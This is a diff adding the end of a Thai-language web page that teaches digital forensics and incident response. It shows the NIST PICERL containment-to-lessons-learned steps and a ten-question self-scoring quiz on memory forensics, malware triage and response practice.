+                content: "• <strong>Short-term:</strong> ตัดสาย LAN หรือแยกเครื่องออกจาก Network (Isolate Host) <em>*ห้าม Restart เด็ดขาดเพื่อรักษา RAM!*</em><br>• <strong>Long-term:</strong> บล็อก IP แฮกเกอร์บน Firewall และปิดพอร์ตบริการที่ถูกโจมตี"
+            },
+            {
+                title: "4. Eradication (การกำจัดรากเหง้าภัยคุกคาม)",
+                content: "• ลบไฟล์มัลแวร์และ Web Shell ทั้งหมดออกจากระบบ<br>• ปิดช่องโหว่ซอฟต์แวร์ (Patch Vulnerability), หมุนคีย์รหัสผ่าน (Rotate API keys & Passwords)"
+            },
+            {
+                title: "5. Recovery (การกู้คืนระบบสู่สภาวะปกติ)",
+                content: "• นำระบบขึ้นใหม่จากคลีนแบ็กอัปที่ตรวจสอบแล้วว่าปลอดภัย<br>• เปิดให้บริการและเฝ้าระวังอย่างใกล้ชิด (Enhanced Monitoring) ตลอด 24-48 ชั่วโมง"
+            },
+            {
+                title: "6. Lessons Learned (การถอดบทเรียน)",
+                content: "• สรุปรายงานเหตุการณ์ (Post-Incident Report) ภายใน 2 สัปดาห์<br>• ปรับปรุงกฎ WAF / SIEM Detection และนำข้อผิดพลาดมาอัปเดต Playbook เพื่อป้องกันซ้ำ"
+            }
+        ];
+
+        function showPicerl(idx) {
+            playClick();
+            document.querySelectorAll('.picerl-card').forEach((c, i) => c.classList.toggle('active', i === idx));
+            const item = picerlData[idx];
+            document.getElementById('picerlDetails').innerHTML = `
+                <div style="font-weight:bold; color:#34d399; font-size:1rem; margin-bottom:8px;">${item.title}</div>
+                <div>${item.content}</div>
+            `;
+        }
+
+        // Quiz Data
+        const dfirQuestions = [
+            {
+                q: "1. เมื่อพบว่าเซิร์ฟเวอร์ตกเป็นเหยื่อของมัลแวร์และถูกแฮก การกระทำข้อใดเป็น 'ข้อห้ามร้ายแรง' ในทาง Digital Forensics?",
+                options: ["A) สั่ง Restart หรือปิดสวิตช์เครื่องทันที", "B) ดึงสายแลนออกเพื่อตัดการเชื่อมต่อ", "C) ดัมป์ข้อมูลหน่วยความจำ RAM", "D) บันทึกภาพหน้าจอ"],
+                ans: 0,
+                exp: "การ Restart หรือปิดเครื่องจะทำให้ข้อมูลใน RAM (Volatile Memory) ซึ่งมีรหัสผ่าน, C2 Socket, และกระบวนการของมัลแวร์ถูกลบทำลายอย่างถาวร"
+            },
+            {
+                q: "2. เครื่องมือ Open-Source มาตรฐานสากลที่ใช้สำหรับการวิเคราะห์ไฟล์ Memory Dump (RAM) คือโปรแกรมใด?",
+                options: ["A) Microsoft Word", "B) Volatility (vol.py)", "C) WinRAR", "D) Photoshop"],
+                ans: 1,
+                exp: "Volatility คือ Memory Forensics Framework ชั้นนำระดับโลกที่ใช้แกะรอย Process, Network Sockets, และ Injection ใน RAM"
+            },
+            {
+                q: "3. ในโปรแกรม Volatility ปลั๊กอินใดใช้สำหรับสแกนหาการเชื่อมต่อเครือข่าย (IP และ Port) ที่เปิดอยู่ในขณะบันทึก RAM?",
+                options: ["A) windows.netscan", "B) windows.calculator", "C) windows.notepad", "D) windows.wallpaper"],
+                ans: 0,
+                exp: "windows.netscan สแกนหาอ็อบเจกต์ Socket TCP/UDP เพื่อดูว่า Process ใดกำลังคุยกับ C2 Server ของแฮกเกอร์"
+            },
+            {
+                q: "4. การทำ Static Malware Analysis หมายถึงการวิเคราะห์มัลแวร์ในรูปแบบใด?",
+                options: [
+                    "A) ดับเบิ้ลคลิกรันไฟล์บนเครื่องของตนเอง",
+                    "B) ตรวจสอบคุณลักษณะของไฟล์ (เช่น Hash, Strings, PE Headers) โดยไม่มีการรันคำสั่งของไฟล์นั้น",
+                    "C) ส่งไฟล์ให้แฮกเกอร์ตรวจสอบ",
+                    "D) ลบไฟล์ทิ้งทันที"
+                ],
+                ans: 1,
+                exp: "Static Analysis คือการตรวจสอบโค้ดและโครงสร้างของไฟล์โดยปลอดภัย โดยไม่มีการสั่ง Execute ไฟล์จริง"
+            },
+            {
+                q: "5. คำสั่ง Linux ใดใช้สำหรับดึงข้อความตัวอักษรที่อ่านออก (Plaintext Strings) ออกมาจากไฟล์ไบนารีต้องสงสัย?",
+                options: ["A) ping", "B) strings", "C) chmod", "D) reboot"],
+                ans: 1,
+                exp: "คำสั่ง 'strings' สแกนหาลำดับตัวอักษร ASCII / Unicode ที่พิมพ์ได้ เพื่อค้นหา URL, IP, หรือ Password ที่แอบฝังอยู่"
+            },
+            {
+                q: "6. ตามกรอบการรับมือภัยคุกคาม NIST SP 800-61 (PICERL) เมื่อตรวจพบการบุกรุก ขั้นตอนแรกที่ต้องทำในระยะ Containment คืออะไร?",
+                options: [
+                    "A) ซื้อเครื่องเซิร์ฟเวอร์ใหม่",
+                    "B) กักกันภัยคุกคาม เช่น ตัดการเชื่อมต่อเครือข่ายของเครื่องเป้าหมายเพื่อป้องกันการแพร่กระจายไปยังเครื่องอื่น",
+                    "C) แจ้งข่าวให้นักข่าวทราบ",
+                    "D) ปิดบริษัท 1 สัปดาห์"
+                ],
+                ans: 1,
+                exp: "Containment มุ่งเน้นการจำกัดขอบเขตความเสียหายไม่ให้ลุกลาม ด้วยการ Isolate เครื่องที่ติดไวรัสออกจากเครือข่าย"
+            },
+            {
+                q: "7. ขั้นตอน 'Eradication' ในกรอบ PICERL มีเป้าหมายหลักเพื่อสิ่งใด?",
+                options: [
+                    "A) กำจัดรากเหง้าของภัยคุกคาม เช่น ลบมัลแวร์, ปิดช่องโหว่, และเปลี่ยนรหัสผ่านที่หลุด",
+                    "B) โจมตีกลับไปยังเซิร์ฟเวอร์ของแฮกเกอร์ (Hack back)",
+                    "C) ทำสัญญากับบริษัทประกันภัย",
+                    "D) ดาวน์โหลดเกม"
+                ],
+                ans: 0,
+                exp: "Eradication คือการกวาดล้างและปิดช่องทางที่แฮกเกอร์ใช้เจาะเข้ามา เพื่อไม่ให้กลับมาเจาะซ้ำได้อีก"
+            },
+            {
+                q: "8. ทำไมการทำ 'Lessons Learned' หลังเหตุการณ์สงบจึงเป็นขั้นตอนที่สำคัญอย่างยิ่ง?",
+                options: [
+                    "A) เพื่อหาตัวคนผิดมาลงโทษ",
+                    "B) เพื่อถอดบทเรียนว่าระบบถูกเจาะได้อย่างไร และนำข้อผิดพลาดมาปรับปรุง Playbook และกฎตรวจจับเพื่อป้องกันเหตุซ้ำในอนาคต",
+                    "C) เพื่อแจกรางวัลพนักงาน",
+                    "D) เพื่อลบ Log ทั้งหมดทิ้ง"
+                ],
+                ans: 1,
+                exp: "Lessons Learned ช่วยให้องค์กรเติบโตและแข็งแกร่งขึ้นจากการถอดบทเรียนจริง และอัปเดตระบบเฝ้าระวังให้รัดกุมกว่าเดิม"
+            },
+            {
+                q: "9. ไฟล์ประเภท 'Fileless Malware' มักอาศัยอยู่ที่ใดเพื่อหลบเลี่ยงโปรแกรมแอนติไวรัสทั่วไป?",
+                options: ["A) ในเครื่องพิมพ์", "B) ในหน่วยความจำ RAM หรือสั่งรันผ่าน PowerShell / WMI โดยไม่บันทึกเป็นไฟล์ .exe บนดิสก์", "C) บนสายเคเบิล", "D) ในหน้าจอคอมพิวเตอร์"],
+                ans: 1,
+                exp: "Fileless Malware อาศัยเครื่องมือที่มีอยู่แล้วในระบบ (Living off the Land) และรันตรงใน RAM จึงตรวจจับด้วย File Scanner ทั่วไปได้ยาก"
+            },
+            {
+                q: "10. เว็บไซต์ยอดนิยมระดับสากลที่ใช้ตรวจสอบค่า SHA-256 Hash ของไฟล์เทียบกับฐานข้อมูลแอนติไวรัสกว่า 70 ค่ายคืออะไร?",
+                options: ["A) YouTube", "B) VirusTotal (virustotal.com)", "C) Google Maps", "D) Facebook"],
+                ans: 1,
+                exp: "VirusTotal คือแพลตฟอร์มคลาวด์ชั้นนำสำหรับตรวจสอบค่าแฮชและพฤติกรรมของไฟล์ต้องสงสัย"
+            }
+        ];
+
+        let dfirAnswers = {};
+        function renderDfirQuiz() {
+            const container = document.getElementById('dfirQuizContainer');
+            let html = "";
+            dfirQuestions.forEach((item, idx) => {
+                html += `
+                    <div class="quiz-card" id="dfCard${idx}">
+                        <div class="quiz-q">${item.q}</div>
+                        <div class="quiz-opts">
+                            ${item.options.map((opt, oIdx) => `
+                                <div class="quiz-opt" id="dfopt_${idx}_${oIdx}" onclick="selectDfirAnswer(${idx}, ${oIdx})">
+                                    ${opt}
+                                </div>
+                            `).join('')}
+                        </div>
+                        <div class="quiz-exp" id="dfexp${idx}">${item.exp}</div>
+                    </div>
+                `;
+            });
+            container.innerHTML = html;
+        }
+
+        function selectDfirAnswer(qIdx, oIdx) {
+            if (dfirAnswers[qIdx] !== undefined) return;
+            dfirAnswers[qIdx] = oIdx;
+
+            const correct = dfirQuestions[qIdx].ans;
+            const chosen = document.getElementById(`dfopt_${qIdx}_${oIdx}`);
+            const correctDiv = document.getElementById(`dfopt_${qIdx}_${correct}`);
+            const exp = document.getElementById(`dfexp${qIdx}`);
+
+            if (oIdx === correct) {
+                playSuccess();
+                chosen.classList.add('correct');
+            } else {
+                playWrong();
+                chosen.classList.add('wrong');
+                correctDiv.classList.add('correct');
+            }
+
+            exp.style.display = 'block';
+            exp.innerHTML = `<strong>💡 เฉลยละเอียด:</strong> ` + dfirQuestions[qIdx].exp;
+
+            let score = 0;
+            for (let q in dfirAnswers) {
+                if (dfirAnswers[q] === dfirQuestions[q].ans) score++;
+            }
+            document.getElementById('dfirScoreDisplay').innerText = `คะแนน: ${score} / 10`;
+            if (score === 10) {
+                document.getElementById('dfirScoreDisplay').innerHTML = `🎉 คะแนน: 10 / 10 (ระดับ DFIR & Incident Response Specialist!)`;
+            }
+        }
+
+        window.addEventListener('DOMContentLoaded', () => {
+            showPicerl(0);
+            renderDfirQuiz();
+        });
+    </script>
+</body>
+</html>
